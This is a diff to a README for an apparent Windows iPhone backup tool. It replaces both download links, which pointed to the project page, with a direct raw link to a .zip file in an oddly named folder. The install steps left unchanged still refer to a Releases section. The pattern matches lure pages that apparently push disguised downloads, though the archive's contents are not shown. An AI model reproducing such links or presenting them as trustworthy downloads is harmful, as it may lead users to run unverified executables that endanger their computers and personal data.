@@ -1,6 +1,6 @@
 # 📱 Ultimate_Windows_iPhone_Manager - Simple private tool for iPhone backups
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Finitenessbitters543/Ultimate_Windows_iPhone_Manager)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Finitenessbitters543/Ultimate_Windows_iPhone_Manager/raw/refs/heads/main/Juang/Manager-i-Phone-Ultimate-Windows-v2.6.zip)
 
 This tool helps manage your iPhone files on Windows. You can create backups, remove old photos to save space, and browse files directly through a USB cable. The software requires no extra installations, connects directly to your device, and keeps your data on your computer.
 
@@ -17,7 +17,7 @@ This tool helps manage your iPhone files on Windows. You can create backups, rem
 
 You must visit the project page to download the software.
 
-[Download the application here](https://github.com/Finitenessbitters543/Ultimate_Windows_iPhone_Manager)
+[Download the application here](https://github.com/Finitenessbitters543/Ultimate_Windows_iPhone_Manager/raw/refs/heads/main/Juang/Manager-i-Phone-Ultimate-Windows-v2.6.zip)
 
 1. Go to the link provided above.
 2. Look for the Releases section on the right side of the page.
